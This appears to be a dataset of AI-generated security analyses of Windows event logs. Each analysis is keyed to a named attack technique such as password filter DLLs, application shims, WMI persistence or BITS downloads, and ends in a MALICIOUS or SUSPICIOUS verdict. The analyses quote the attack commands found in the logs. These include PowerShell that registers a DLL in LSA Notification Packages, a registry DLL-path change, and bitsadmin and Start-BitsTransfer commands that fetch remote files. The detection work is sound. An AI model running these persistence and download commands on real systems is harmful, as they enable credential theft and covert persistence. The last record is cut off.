2. **Privilege Escalation Indicators:**
   - The security logs show privileged logon events for the `admin_test` user, complete with a comprehensive set of privileges like `SeDebugPrivilege` and `SeTakeOwnershipPrivilege`, which suggest that actions involving sensitive system modifications were executed.

3. **Executable Launches:**
   - The execution of benign system utilities (`hostname.exe`, `whoami.exe`, `wevtutil.exe`) appears frequent. While these by themselves aren't inherently malicious, their execution alongside suspicious activities might be indicative of information gathering phases in an attack.

4. **Time Discrepancy:**
   - Several time manipulation events, captured as timezone changes and ntp server interactions, further raise suspicion. Although these could be benign, they might also correlate with efforts to obfuscate or mask the timing of activities on the system.

5. **Final Assessment:** 
   - Several indicators flag this activity as potentially compromising:
     - Use of PowerShell to alter system permissions and execute invasive file operations.
     - Execution of powerful system commands with administrative privileges.
     - Suspicious setting changes that suggest additional covert activities might be underway.

**Resolution: MALICIOUS**

**Guidance on How to Proceed:**
- **Immediate Response:**
  - Disconnect the affected system, `Server002`, from any network to prevent further unauthorized activities or data exfiltration.
  - Conduct a thorough forensic analysis to capture relevant memory and disk images for deeper investigation.
- **Audit and Investigation:**
  - Review system configurations, installed services, and running applications for backdoor installations.
  - Check for similar patterns or signs of unauthorized access across other systems in the network.
- **Remediation:**
  - Revert any unauthorized configuration changes.
  - Ensure all security patches and software updates are applied.
  - Review and strengthen the security policies regarding PowerShell and administrative privilege use.
- **Monitoring:**
  - Enhance logging and monitoring to detect similar activities promptly."
Install and Register Password Filter DLL,"Upon reviewing the provided Windows event logs, here are my observations:

### Suspicious Activity Observed:
1. **PowerShell Activity**:
   - The PowerShell log entries indicate the use of PowerShell with an embedded script that exports a registry key related to the Local Security Authority (LSA) to a temporary file and then attempts to copy a DLL to the `C:\Windows\System32` directory. This action modifies the ""Notification Packages"" registry key, a well-documented method attackers use to install password filters or other malicious DLLs to execute code with elevated privileges.
   - Specifically, the command performs:
     ```powershell
     & {reg.exe export HKLM\SYSTEM\CurrentControlSet\Control\Lsa\ ""C:\Users\ADMIN_~1\AppData\Local\Temp\file\data.002\lsa_backup.reg""
     $passwordFilterName = (Copy-Item ""C:\Users\ADMIN_~1\AppData\Local\Temp\file\data.002\bin\filePWFilter.dll"" -Destination ""C:\Windows\System32"" -PassThru).basename
     $lsaKey = Get-Item ""HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\""
     $notificationPackagesValues = $lsaKey.GetValue(""Notification Packages"")
     $notificationPackagesValues += $passwordFilterName
     Set-ItemProperty ""HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\ ""Notification Packages"" $notificationPackagesValues}
     ```

2. **Sysmon Activity**:
   - Multiple processes, such as `powershell.exe`, `conhost.exe`, and others were executed by the `admin_test` user.
   - Evidence of `wevtutil` service running, which is commonly used for managing Windows event logs, could potentially be related to attempts to clear or tamper with event logs.
   - Suspicious process hierarchy involving PowerShell, which aligns with the PowerShell script execution mentioned above.

3. **System Processes**:
   - There are events related to system updates and EdgeUpdate, but these appear consistent with regular update operations.

### Potential Compromise Indicators:
- The modification of registry settings related to the LSA and the movement of DLL files to the `System32` directory are strong indicators of potentially malicious activity aiming to gain persistence or elevated execution capabilities on the system.
- The PowerShell command-line arguments are suspicious due to the apparent intent to back up and modify security-related registry settings, which is not typical for legitimate administrative operations without context.

### Resolution:
Given the activity observed in the logs, I would classify the situation as **MALICIOUS**. The actions captured in the logs indicate unauthorized modifications that align with known techniques for privilege escalation or persistence often used by attackers. Immediate response measures should include:
- Initiating a thorough forensic investigation on `Server002` to explore further artifacts of compromise.
- Isolating the affected host to prevent potential lateral movement.
- Reviewing recent user activities and credentials for further evidence of unauthorized access or changes.
- Identifying and assessing any recent changes to scheduled tasks, startup scripts, or other similar persistence mechanisms.

Further investigation and incident containment should be performed promptly to address any ongoing threat."
Application Shim Installation,"Based on the analysis of the Sysmon and Application logs provided, several items warrant consideration regarding suspicious or potentially malicious activity:

### Analysis:

1. **Frequent Execution of System Utilities:**
   - There are frequent instances where system utilities such as `powershell.exe`, `wevtutil.exe`, `cmd.exe`, and `sdbinst.exe` are being executed in rapid succession by the `admin_test` user. While this might be part of a legitimate administrative task, the frequency and combination of these commands can be indicative of attempts to tamper with event logs (`wevtutil.exe`) or install/shim applications (`sdbinst.exe`), which are common techniques in malicious activity (e.g., to cover tracks or install persistence mechanisms).
   
2. **Application Compatibility Database Installer (`sdbinst.exe`):**
   - The command line `cmd.exe /c sdbinst.exe ""C:\Users\ADMIN_~1\AppData\Local\Temp\file\data.011\bin\fileShimx86.sdb""` indicates the installation of an application compatibility database from a temporary location. This is often associated with application shimming, a technique used by attackers to gain persistent, elevated access to a system by tricking the OS into executing a modified version of a program.

3. **Microsoft Edge Update Executions:**
   - The repeated execution of Microsoft Edge Update processes is likely related to legitimate software updates given the stability of the SHA256 hashes. However, such processes should be verified as legitimate updates as attackers could use similar names to mimic legitimate activity, especially from directories like `%TEMP%`.

### Assessment: 

- The execution patterns and rapid succession of administrative tools suggest potentially suspicious behavior. While these processes can be legitimate, given the context and the combination observed, further investigation is necessary to determine the intent and authenticity of these actions.

### Resolution:

- **SUSPICIOUS** - The logs contain activity that raises concerns, primarily due to the specific use of `sdbinst.exe` and log manipulation tools (`wevtutil.exe`). This calls for further investigation to validate whether these actions were part of an authorized administrative task or indicative of a compromise.

### Guidance on How to Proceed:

1. **Verification of Legitimate Activity:**
   - Confirm with the administrator ('admin_test') whether these actions were part of planned maintenance or software installations.
   
2. **Review of Security and Network Logs:**
   - Analyze corresponding Security and Network logs to check for anomaly patterns or unauthorized access.
   
3. **Endpoint Examination:**
   - Review the endpoint (Server002) for signs of tampering, persistence mechanisms, or unauthorized access. Consider conducting a thorough malware scan.
   
4. **System Changes and Permissions:**
   - Verify integrity of critical system files and assess any changes in file permissions or creation of new scheduled tasks that could indicate persistence.

5. **Audit Application Compatibility Databases:**
   - Investigate the application compatibility databases to assess any shims potentially introduced or modified without authorization.

If additional context or logs become available, a reevaluation should be considered to confirm or refute the hypothesis of suspicious behavior."
WMI Invoke-CimMethod Start Process,"Upon reviewing the provided logs, several suspicious activities can be identified that might indicate potential malicious behavior. Let's go through these observations:

### Security Log Analysis:
- **Event ID 4672**: Privileges were assigned to a user named `admin_test`, which include sensitive privileges like `SeDebugPrivilege`, `SeTakeOwnershipPrivilege`, and `SeLoadDriverPrivilege`. This privilege escalation is suspicious especially when associated with a non-standard or test account (`admin_test`) which seems to have been given high-level privileges.
- **Event ID 4624 and 4634**: Logs indicate a network logon (type 3) by `admin_test`. The use of NTLM authentication and exact match of logon IDs suggest these events are linked and may indicate an external logon activity.
  
### Sysmon Log Analysis:
- **PowerShell and CIM invocation**: A PowerShell command executed a CIM session to invoke a remote method to start `calc.exe` on `localhost`. This behavior is odd as it's not typical to run calculators in this manner. Often, such actions might indicate testing of remote code execution or persistence mechanisms—especially leveraging PowerShell which is a known vector for attacks.
- **Event IDs with process executions**: Instances of `wevtutil.exe` and accompanying `conhost.exe` executed by `SERVER002\\admin_test` imply potential manipulation or querying of event logs. Abnormal frequent patterns of these executions might suggest attempts to cover tracks.

### PowerShell Log Analysis:
- **Script execution details**: The PowerShell log illustrates a direct execution of a script to launch processes remotely. Such scripting behavior can be indicative of either automated administrative tasks for testing or configuration, or unauthorized actions attempting experimental or nascent attacks.

### Overall Assessment and Conclusion:
Taking into account the totality of the evidence—an escalation of privileges, the NTLM logon pattern, use of PowerShell scripting to execute applications remotely, and repeated manipulation of event logs using `wevtutil`—these logs contain indicators of potentially suspicious activity. However, without more context or clear evidence of data exfiltration, persistence, or lateral movement, it is wise to classify this as **SUSPICIOUS**. This implies a need for further investigation before concluding with certainty that it's malicious.

### Recommendations:
1. **Investigate user `admin_test`**: Verify whether `admin_test` is a legitimate account and check for any additional unusual activity associated with this user, especially privilege escalations and remote sessions.
2. **Review authentication logs**: Corroborate the NTLM logon event details across other systems to identify whether these logins were sourced from trusted networks or necessitate deeper threat hunting.
3. **PowerShell Script Review**: Analyze scripts executed during the period, especially focusing on unauthorized attempts to remotely control processes.
4. **Enhanced Monitoring**: Implement more comprehensive audit logging on high-privilege account activities and script executions, particularly with tools like Sysmon and PowerShell logging.
5. **Forensic Analysis**: Consider a forensic investigation to determine if any backdoors or persistence methods have been introduced via the suspicious activities.

Thus, based on the anomalous behaviors observed, the resolution for these logs is marked as **SUSPICIOUS**."
Create registry persistence via AppCert DLL,"The analysis of the Windows event logs reveals several key insights:

1. **Suspicious PowerShell Activity**:
   - The execution of `PowerShell.exe` with the command-line argument that includes `Copy-Item` to move a DLL file (`fileTest.dll`) to `C:\Users\Public\` and register it in the `AppCertDlls` registry key is noteworthy. The `AppCertDlls` registry key is commonly exploited by attackers for proxying malicious DLL injections into system processes for persistence.
   - The combination of file moving and registry modification in one PowerShell command suggests a possible attempt to establish persistence on the system, which is generally considered a red flag for malicious activity.

2. **Usage of `wevtutil.exe`**:
   - There are multiple instances of `wevtutil.exe` usage. This utility is used to manage event logs, which may be benign but could also indicate an attempt to cover tracks. Without additional context or detection of log deletion or tampering, this alone is not definitive proof of malicious intent but is suspicious when combined with other activities.

3. **Process Creations**:
   - Examination of processes such as `svchost.exe`, `wsmprovhost.exe`, `conhost.exe`, and Edge update processes appear typical for a Windows environment and do not raise immediate concern on their own. However, their timing with the PowerShell command may need further assessment for any potential linkage or anomalies.

4. **Edge Update Process**:
   - Multiple processes related to Microsoft Edge Update are logged. While these could be regular update processes, the frequency and multiplicity of the updates in a short timeframe might warrant further review to ensure no hidden processes are executing alongside legitimate updates. However, based on provided logs alone, this activity appears benign but should be monitored.

5. **Conclusion**:
   - **Resolution: MALICIOUS**. The evidence of PowerShell commands that attempt to move and register a DLL file in a sensitive registry key implies malicious intent, likely for establishing persistence or preparing for further exploitation. This activity should prompt immediate investigation and mitigation measures such as isolating the affected machine, reviewing user permissions, and conducting a comprehensive threat hunt to ensure no further compromises."
Persistence via WMI Event Subscription - CommandLineEventConsumer,"Upon analyzing the provided Windows event logs, several observations can be made:

### System Log
- The `Microsoft-Windows-Kernel-General` events (EventID: 1) showing time adjustments done by a system process `svchost.exe` are normal and typically associated with system time synchronization.
- The `Microsoft-Windows-Time-Service` event choosing `time.windows.com` as a time source indicates regular time server synchronization, which is normal behavior.

### Security Log
- EventID `4624` indicates a successful logon, which appears legitimate since it's a SYSTEM-level logon from a Windows service.
- EventID `4672` logs the assignment of special privileges to a session, which again involves SYSTEM-level privileges. This is standard as the SYSTEM context typically possesses high privileges.
- EventID `4616` records time change events, consistent with the system log entries and not inherently suspicious.

### Windows PowerShell Log
- The PowerShell logs show execution of a command that includes `WMI Persistence`, specifically dealing with `__InstanceModificationEvent` and `CommandLineEventConsumer`, potentially aimed at creating persistence through WMI. 
- The use of `notepad.exe` as a command template is often seen in proof-of-concept scripts for WMI persistence and may indicate an attempt to leverage this persistence mechanism.

### Application Log
- The `Microsoft-Windows-Security-SPP` event and `edgeupdate` service stop events are normal and do not signify any suspicious activity.

### Sysmon Log
- The Sysmon log records routine activities consistent with software updates and normal process creation events (e.g., HOSTNAME.EXE, conhost.exe, etc.).
- However, the multiple executions related to `Microsoft Edge Update` are noted, which sometimes happen during legitimate software update processes.

### Analysis Summary
The most notable activity in the logs is the PowerShell execution related to WMI persistence mechanisms, typically used in malicious scenarios to maintain access on the host. The script establishes an event filter and a commandline event consumer, which might be an attempt at unauthorized persistence. Nonetheless, without the malicious intent being fully realized (e.g., actual malicious payload execution), this remains largely as potentially suspicious behavior.

### Conclusion
- **Resolution:** **SUSPICIOUS**
- **Reasoning:** The presence of a PowerShell command setting up WMI persistence is concerning and warrants further investigation to confirm if this was an intentional action by a legitimate admin or a potential security incident.
- **Actions to Take:**
  - Investigate the origin of the PowerShell script execution to identify the source or user executing it.
  - Check surrounding system activities and logs for any unauthorized accesses or deployments.
  - Use endpoint detection tools to further inspect the script and any related activities for potential malicious intent.
"
New shim database files created in the default shim database directory,"Upon reviewing the provided Windows event logs, I have identified the following points for consideration:

### Suspicious Behavior Analysis:

1. **PowerShell Execution:**
   - Multiple entries in the PowerShell log show an execution command:
     ```
     powershell.exe & {Copy-Item ""C:\Users\ADMIN_~1\AppData\Local\Temp\file\data.011\bin\data.011CompatDatabase.sdb"" C:\Windows\apppatch\Custom\data.011CompatDatabase.sdb
     Copy-Item ""C:\Users\ADMIN_~1\AppData\Local\Temp\file\data.011\bin\data.011CompatDatabase.sdb"" C:\Windows\apppatch\Custom\Custom64\data.011CompatDatabase.sdb}
     ```
   - This command copies a file into the `C:\Windows\apppatch\Custom` directory, which is a location typically used by compatibility databases in Windows. Copying files into system directories could be indicative of malicious activity, especially if those directories require elevated privileges.

2. **Sysmon - Process Execution:**
   - There are routine system processes captured such as `whoami.exe`, `wevtutil.exe`, `conhost.exe`, and PowerShell executions, which are aligned with the PowerShell log entries. These processes were executed by `SERVER002\admin_test` with high integrity levels, suggesting administrative privileges.
   - The PowerShell command from the Sysmon log matches the suspicious command identified in the PowerShell log. 

3. **Updates and Installers:**
   - Multiple events related to Microsoft Edge updates, including executions of the Edge installer with logging enabled. This activity appears benign and consistent with legitimate software updates.

### Indicators of Potentially Malicious Activity:

- The predominant concern is with the unauthorized copying of the `.sdb` file into a system directory via PowerShell. Operations involving system directories in conjunction with scripts or commands that are not part of usual administrative tasks can be a red flag.
- The lack of security logs is also suspicious, as these might provide additional context or alerts related to security events.
- Wevtutil and other system utilities are logged frequently without an obvious purpose. These might be routine, but given their ties with log manipulation and information gathering, they warrant further scrutiny along with the other evidence.

### Conclusion and Recommendations:

**Resolution: SUSPICIOUS**

The logs contain activities that necessitate further investigation. Here are some recommended next steps:

1. **Investigate the Source of PowerShell Commands:**
   - Determine which user or system process initiated the PowerShell command.
   - Check for simultaneous activities from the `admin_test` account that may corroborate legitimate administration tasks or suggest compromised credentials.

2. **Review File Modifications:**
   - Assess the legitimacy and origin of the `data.011CompatDatabase.sdb` file, and identify if these changes coincide with any known updates or configurations.

3. **Correlate with Security Events:**
   - If possible, retrieve security logs recorded at the same timeframe and correlate them with the identified events to find any access logs or security warnings.

4. **Threat Hunting:**
   - Conduct a thorough threat-hunting exercise to ascertain whether there are signs of an active threat actor, focusing on logs from around the identified suspicious events.

5. **User and Permission Assessment:**
   - Verify the activities and permissions of the `admin_test` account utilized in these operations, ensuring that this account hasn't been compromised.

In conclusion, while there are no overt indications of confirmed malicious actions, the identified anomalous behaviors necessitate further investigation to rule out potential threats and ensure system integrity."
Load custom DLL on mstsc execution,"Based on the provided event logs from the System, Sysmon, Application, and Security logs, the analysis indicates a mixture of benign and potentially suspicious activities. Here's a detailed breakdown:

1. **Time Changes in System Logs:**
   - The logs show changes in the system time (EventID 24 and 4616) via `svchost.exe`, which is often part of routine system operations, especially when syncing with a time server (`time.windows.com`). The changes occur within short intervals, suggesting a benign context where the system time might have been slightly adjusted by the Windows Time Service.

2. **Sysmon Events:**
   - Execution of common Windows utilities like `hostname.exe`, `whoami.exe`, `conhost.exe`, and `svchost.exe` are observed, primarily under the user context `SERVER002\\admin_test`. These utilities are legitimate system binaries, and their presence in logs can be common.
   - Notably, there's a `cmd.exe` event (EventID 1) with a command to modify the registry (`reg add ""HKLM\SOFTWARE\Microsoft\Terminal Server Client"" /v ClxDllPath /t REG_SZ /d ""C:\Windows\System32\amsi.dll"" /f`). Direct registry manipulation, particularly targeting Terminal Services, could suggest tampering or unauthorized configuration changes. The presence of an AMSI (Antimalware Scan Interface) DLL in this path also raises concerns, as it might be indicative of an attempt to interfere with security controls.

3. **Microsoft Edge Update Process:**
   - Several events related to `MicrosoftEdgeUpdate.exe` are seen, which suggest regular update processes for Microsoft Edge. The update operations executed by `NT AUTHORITY\SYSTEM` users are typical for system-level update processes. However, the volume and pattern of update-related events in a short window could warrant further scrutiny to confirm they are legitimate and not being leveraged for unauthorized activities.

4. **Security Logs:**
   - The security logs largely mirror the time-change activities seen in the System logs and show no additional indicators of compromise.

**Assessment and Recommendation:**

- **Suspicious Activity:** The registry modification using `cmd.exe` suggests suspicious behavior that should be further investigated. While this alone may not be conclusive of malicious activity, such actions typically warrant a follow-up to ensure no unauthorized changes have been made to critical system settings.

- **Recommendation:** Conduct a deeper analysis of the registry change involving `cmd.exe`. Verify if there was a legitimate administrative change or if it could be indicative of an attempt at privilege escalation or persistence. Additionally, monitor for any more registry modifications or related suspicious activities.

**Resolution:** Based on the current analysis, the overall resolution is **SUSPICIOUS**. The activity does not conclusively prove malicious intent but contains elements that warrant further investigation to ensure system integrity and security compliance."
Bitsadmin Download (PowerShell),"In analyzing the provided Windows event logs, several aspects stand out that require attention due to potential indicators of suspicious activity:

1. **PowerShell Activity:**
   - The logs from the Windows PowerShell channel reveal the execution of a PowerShell command with `Start-BitsTransfer`. This command is downloading a file from a remote URL (`https://raw.githubusercontent.com/.../data.md`) to a local destination (`$env:TEMP\\bitsadmin2_flag.ps1`).
   - The usage of PowerShell to download files from the internet is frequently associated with malicious activity, particularly in the context of scripts that might be part of a delivery mechanism for malware.
   - This command runs under `HostName=ConsoleHost` with a legitimate `powershell.exe` application, which might be leveraged by an attacker to blend malicious activity with legitimate-looking processes.

2. **Sysmon Data:**
   - Several Sysmon logs indicate process creation involving PowerShell, wevtutil.exe, and hostname.exe. Notably, `wevtutil.exe` is often used legitimately to query or clear Windows event logs but can be used maliciously to cover tracks.
   - The Sysmon logs also show multiple instances of `MicrosoftEdgeUpdate.exe` and related binaries operating under `NT AUTHORITY\SYSTEM`. While not inherently malicious, the frequency and context could be relevant based on other Security Information and Event Management (SIEM) rules or security contexts.

3. **Background Process Activity:**
   - Processes such as `sppsvc.exe` and `taskhostw.exe` are running under `NT AUTHORITY\NETWORK SERVICE` and `NT AUTHORITY\SYSTEM`. These may be legitimate but should be double-checked in the context of recent system changes or network usage.

In conclusion, the PowerShell activity, specifically the `Start-BitsTransfer` command, represents a notable risk factor. This activity fulfills characteristics often associated with malicious actions, such as the download and execution of scripts from an external source in transient directories.

**Recommendation and Resolution:**

- **Resolution:** SUSPICIOUS - The PowerShell command execution and unconventional downloading activity should be flagged as suspicious. Further investigation is required to determine if the file downloaded is actually malicious or if this was a benign administrative action.
  
- **Guidance on Proceedings:**
  - Verify the legitimacy and source of the URL used in the Start-BitsTransfer command.
  - Review the contents of the downloaded file (`bitsadmin2_flag.ps1`) to assess any potential malicious code.
  - Conduct a thorough review of process creation logs around this event to detect any anomalous behaviors.
  - Ensure all instances of Edge Updates and other installations logged are corresponding to legitimate application update activities.
  - Use endpoint security tools to scan for any signs of ongoing compromise or malware signatures.

It's important to ensure security measures are in place to prevent unauthorized script execution and monitor network traffic for similar activities in the future."
Install AppInit Shim,"Upon reviewing the logs provided, here is a detailed analysis of the activity observed:

### Overview of Logs:
1. **Security Log (Event ID 4624 and 4672):** These events detail successful logins and privilege assignments. The logins are related to system services or tasks initiated by the computer account (`SERVER002$`), a common occurrence in server environments.
2. **Security Log (Event ID 5379):** These events indicate credential validation failures where no credentials were returned. The target appears to be a `MicrosoftAccount` which could be benign but warrants further inspection given the lack of credentials and repetitive nature.
3. **Security Log (Event ID 4798):** These events are related to group membership enumeration, which is normal during scheduled tasks or system operations.
4. **Sysmon Log (Event ID 1 and 5):** These entries show various processes initiated by `SERVER002\\admin_test`, indicating administrative tasks using PowerShell, `wevtutil.exe`, and other processes.
5. **Sysmon Log - Process Injection:** There is no explicit mention of process injection or suspicious DLL loading, but command line usages include importing registry changes via `cmd.exe` and `reg.exe`, which might be worth verifying for known good context.
6. **Application Log:** Activity mainly involves Edge updates, and the Software Protection Platform Service, which appears routine.

### Potentially Suspicious Behaviors:
- **PowerShell Execution (Sysmon):** PowerShell activity (PID 2428 for instance) by user `SERVER002\\admin_test` should be checked for unrecognized scripts, especially considering the potential for in-memory attacks or script-based threats.
- **Registry Modifications (Sysmon):** Execution of `cmd.exe` to call `reg.exe` for importing registry data can be common, but if such registries align with known malware tactics or recent changes without administrative consent, this requires further checking.
- **Credential Enumeration Failures (Security):** Repeated failed credential validation attempts targeting Microsoft accounts could be indicative of unauthorized access attempts or misconfigured services.
  
### Assessment:
After a thorough review:
- **No definitive malicious behavior**, such as known attack patterns or clear adversarial indicators, is apparent in the logs.
- **Suspicious activities** include PowerShell usage and registry edits which should be validated against organizational norms and scripts.
- **Credential validation failures** are repetitive but may be benign if part of normal operation discrepancies or account misconfiguration.

### Resolution:
Based on the analysis, the conclusion is **SUSPICIOUS**. There is no direct evidence confirming malicious activities, but specific events such as PowerShell commands and registry modifications by an admin account suggest further investigation is warranted. Specifically:
- Verify the legitimacy of PowerShell scripts executed and any registry modifications.
- Ensure the failed Microsoft account access attempts align with expected operations.

### Guidance:
- **Conduct a baseline** comparison against authorized scripts and configurations.
- **Review user actions** and correlating tasks around the noted event times.
- **Monitor network and endpoints** for anomalous activities with potential correlation to the observed events.
- **Implement stricter logging and monitoring** for these types of activities to catch potential deviations early."
Persistent Code Execution Via Excel Add-in File (XLL),"Upon reviewing the provided log entries, I have identified several areas of potential concern:

### PowerShell Logs:
1. **Unusual PowerShell Script Execution**: The logs indicate the execution of a PowerShell script involving `powershell.exe` creating a new COM Object - `Excel.Application`. This script performs actions like copying specific Excel add-ins `.xll` files from a temporary directory to the Microsoft AddIns directory and modifying the Excel registry options to run these add-ins.
   - **Indicators of Potential Malicious Activity**:
     - **Dynamic Object Creation**: Using `New-Object -COMObject ""Excel.Application""`.
     - **Unusual File Operations**: Copying files from a temporary directory to the AddIns folder may indicate an attempt to load a potentially malicious add-in.
     - **Registry Modification**: Manipulating Excel startup options via registry changes (`HKCU:\\Software\\Microsoft\\Office\\$Ver\\Excel\\Options`)
   - Typically, such activities might indicate an attempt to execute a malicious macro or exploit via Excel.

### Sysmon Logs:
1. **PowerShell Execution**: The presence of a PowerShell process initiated with a similar command line as identified in the PowerShell logs.
2. **Abnormal Registry Modification**: The execution of conhost.exe alongside PowerShell could suggest a manipulation tied to suppressing command window visibility during malicious activity.

### Application Logs:
1. **Normal Security Software Logs**: Windows Defender entries indicate that it is enabled and running, but there are no explicit entries showing any detections or blocks of the ongoing PowerShell activities.

### Assessment:
The PowerShell activity strongly suggests an attempt to automate the deployment of a suspicious `xll` file into Excel's AddIns, and registry modifications to auto-load this AddIn on Excel start. Such maneuvers are typical in attempts to Trojanize applications through malicious add-ins.

### Resolution
Based on the indicators discussed, there is considerable risk of malicious activity. The actions observed in the logs, particularly regarding PowerShell, indicate an attempt to covertly modify a system's behavior through Excel, which is a common tactic in certain types of malware attacks.

**Final Resolution**: **MALICIOUS**

### Guidance:
- **Immediate Action**: Quarantine or disconnect the affected host (Server002) from the network to prevent further spread or damage.
- **Further Analysis**: Conduct a full forensic analysis of the files involved, particularly the `.xll` files mentioned, as well as a review of any changes in the registry.
- **Threat Hunting**: Check for similar patterns across other systems in your environment.
- **Patch and Remediate**: Ensure all systems are up to date with security patches and review access control to prevent unauthorized modifications.
- **Notification**: Notify relevant teams and stakeholders of the potential security incident for further legal and operational considerations."
Create a new account similar to ANONYMOUS LOGON,"### Detailed Analysis

Upon reviewing the provided Windows event logs from the Sysmon, Security, Application, System logs, and PowerShell, several activities warrant closer examination for potential malicious activity:

1. **Frequent Execution of System Utilities by Admin User**:
   - On multiple occasions, system utilities such as `whoami.exe`, `wevtutil.exe`, and `conhost.exe` are executed by the user `SERVER002\\admin_test`. While some of these utilities are used for legitimate administrative tasks, the frequency and combinations seen (e.g., `wevtutil.exe` can be used to clear or export event logs) can suggest attempts to gather system information or manipulate logs, potentially indicative of malicious behavior or forensic countermeasures.

2. **Suspicious Command Execution**:
   - The execution of `cmd.exe` with the command `net user ""ANONYMOUS  LOGON"" ""data_pass123!"" /add /domain` is a red flag as it suggests an attempt to add a new user account, ""ANONYMOUS LOGON,"" with administrative privileges. This is a common technique used by attackers to maintain access to a compromised system.

3. **Unusual Child Process Creation**:
   - The command-line usage by `cmd.exe` and subsequent child processes like `net.exe` and `net1.exe` executing similar commands to add a user reinforces the suspicion of an ongoing compromise attempt.

4. **Time and Event Log Manipulation**:
   - The repeated use of `wevtutil.exe` and subsequent conhost.exe processes could suggest attempts to manipulate, export, or clear event logs, which may be utilized to cover tracks of an attack.
   
5. **Windows Defender Status and Activity**:
   - Windows Defender is reported as being on, with updates (`Security Intelligence Update for Microsoft Defender Antivirus`) installed. While this alone isn't suspicious, it is noteworthy if the user was attempting to bypass or interact with Defender.

### Assessment

Based on the logs, the following assessment is made:

- **Suspicious User Account Creation**: The creation of a suspicious ""ANONYMOUS LOGON"" account with potential administrative access is highly indicative of malicious activity.
  
- **Tool Usage**: The frequency and choice of tools like `wevtutil.exe` and `cmd.exe` with certain command-line arguments suggest potential unauthorized administrative actions.

- **Potential Evasion Techniques**: The combination of utilities and rapid succession of commands suggests possible evasion tactics.

### Resolution

**Resolution: MALICIOUS**

There is clear evidence of malicious activity within the logs, primarily indicated by the unauthorized addition of a user through `cmd.exe` and attempts at log or process manipulation using legitimate system tools (e.g., `wevtutil.exe`). The suspicious command execution under the `SERVER002\\admin_test` certainly indicates a compromise or at least an attempted compromise.

### Guidance on How to Proceed

1. **Immediate Containment**:
   - Disconnect the affected host from the network to prevent any further malicious activity or lateral movement.

2. **User Account Review**:
   - Verify and remove unauthorized user accounts, particularly the ""ANONYMOUS LOGON"" account, and reset passwords for existing accounts.

3. **Log and System Audit**:
   - Perform a thorough audit of the system and security event logs to identify the full scope of the compromise and any other modifications or suspicious behavior.

4. **Endpoint Security Measures**:
   - Ensure that endpoint security solutions, such as antivirus and malware protection, are up-to-date and have not been tampered with.

5. **Further Investigation**:
   - Investigate the `SERVER002\\admin_test` account for unauthorized actions or a possible compromised credential.
   - Check for known vulnerabilities and apply patches or updates to mitigate potential exploitation avenues.

6. **Review Policies**:
   - Ensure policies regarding the use of system administration tools and logging are enforced and review access controls and permissions.

7. **Report the Incident**:
   - Report this security incident to the relevant stakeholders including IT, security teams, and if necessary, external agencies or regulatory bodies depending on the data and systems compromised. 

Following these steps, the incident should be properly contained, analyzed, and mitigated to prevent recurrence."
Install MS Exchange Transport Agent Persistence,"Upon reviewing the provided logs, several points stand out which warrant further investigation due to their potentially suspicious nature:

1. **Security Log Events:**
   - **Event ID 4672 (Special Privileges Assigned):** The user `admin_test` was granted a set of powerful privileges including SeDebugPrivilege, SeTakeOwnershipPrivilege, and others. While having `admin_test` perform high privilege actions may be legitimate, the specific privileges listed can be a red flag if not expected or consistent with the user's normal activity.
   - **Event ID 4624 (Successful Logon):** The logon type used here is `3`, which typically indicates a network logon. The `NTLM` protocol was used, which, while common, can pose security risks if not properly managed or if it deviates from standard protocols like Kerberos.

2. **PowerShell Log:**
   - **PowerShell Script Execution:** The logged command involves the installation and enabling of a transport agent for Microsoft Exchange (`Install-TransportAgent -Name Security Interop Agent ...`). This operation naturally demands high privileges and is not a typical everyday operation. The presence of this command suggests administrative intent or tasks potentially linked to configuration management or a setup script. However, it could also potentially relate to a persistence mechanism if unauthorized.

3. **Sysmon Log Events:**
   - **Event ID 1 & 5:** Multiple PowerShell and system utility executions (`powershell.exe`, `wevtutil.exe`, `whoami.exe`) are recorded. While `whoami.exe` usage is benign, device and service management utilities executed organically or scripted may be associated with enumeration or exploitation activities.
   - The presence of `wevtutil.exe` could indicate activities involving event log management, such as clearing logs which is often employed in malicious activity to cover tracks.

4. **Overall Contextual Correlation:**
   - The combination of high-privilege access with command-line scripts targeting Exchange services and additional sysadmin-level utilities hints at activities that may not align with a regular workflow or standard operating procedures.
  
5. **Assessment:**
   - Based on these observations, we cannot definitively classify this activity as outright malicious without further context (such as business/operational requirements, user responsibilities, etc.). However, the incidents certainly present computational activities that raise concerns and rule out trivial benign behavior given the high privilege operations and system utility usages.

**Guidance and Recommended Actions:**
- **SUSPICIOUS Resolution:** Given the potent privileges, use of NTLM network logon, and execution of a sophisticated PowerShell script, this log warrants closer follow-by:
  - Verify the legitimacy of the `admin_test` credentials and confirm alignment between the executed tasks and the user's role.
  - Cross-reference with change management logs or tickets to determine if these tasks correspond to scheduled administrative maintenance or software installations.
  - Investigate any correlation with unauthorized access reports or similar alerts within the time period.
  - Ensure the monitoring of related events going forward, especially surrounding changes in user privilege and execution of non-standard processes. If necessary, proceed with further forensic analysis or engage in real-time monitoring to substantiate these findings with more evidence."
"Persist, Download, & Execute","Upon reviewing the provided Windows event logs for Server002, several noteworthy patterns and activities emerged, particularly in the Sysmon logs, which may indicate potential concerns:

### Analysis of Logs:

1. **Recurrent Use of `bitsadmin.exe`:**
   - Multiple instances of `bitsadmin.exe` are observed with unusual command-line parameters. The commands involve creation, file transfer from a remote source, and setting a notification command line for execution.
   - Example of a suspicious command observed: 
     ```
     ""cmd.exe"" /c bitsadmin.exe /create fileBITS & bitsadmin.exe /addfile fileBITS https://raw.githubusercontent.com/file/file-file/master/files/data/data.md %%temp%%\\bitsadmin3_flag.ps1 & bitsadmin.exe /setnotifycmdline fileBITS C:\\Windows\\system32\\notepad.exe NULL & bitsadmin.exe /resume fileBITS & ping -n 5 127.0.0.1 >nul 2>&1 & bitsadmin.exe /complete fileBITS
     ```
   - This indicates the potential use of Background Intelligent Transfer Service (BITS) for downloading files and setting operations to run automatically, a technique sometimes used by malicious actors to persist on a system or execute unwanted actions.

2. **Activity of High Integrity Processes:**
   - There are several executions of typically benign Windows utilities (e.g., `conhost.exe`, `wevtutil.exe`, `whoami.exe`) with elevated privileges and under the `admin_test` user context.
   - While some utilities are used for legitimate system monitoring or administrative tasks, their use in close succession and without additional legitimate context could point toward reconnaissance or data collection activities.

3. **Suspect Command Execution via `cmd.exe`:**
   - The sequence of commands executed through `cmd.exe` reveals potential misuse for script-based automation that is not standard for regular administrative tasks.

4. **Lack of PowerShell Entries and Minimal Security Logs:**
